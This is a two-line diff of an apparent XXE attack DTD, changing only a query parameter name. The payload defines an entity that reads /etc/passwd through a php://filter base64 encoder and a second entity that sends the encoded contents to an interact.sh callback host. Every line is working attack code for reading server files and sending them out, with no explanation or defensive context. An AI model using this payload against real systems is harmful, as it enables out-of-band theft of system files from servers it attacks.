@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://cc0yxs72vtc0000bpbw0ggyxqhoyyyyyb.interact.sh/?ddddddddddddddd=%data;'>">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://cc0yxs72vtc0000bpbw0ggyxqhoyyyyyb.interact.sh/?arash=%data;'>">
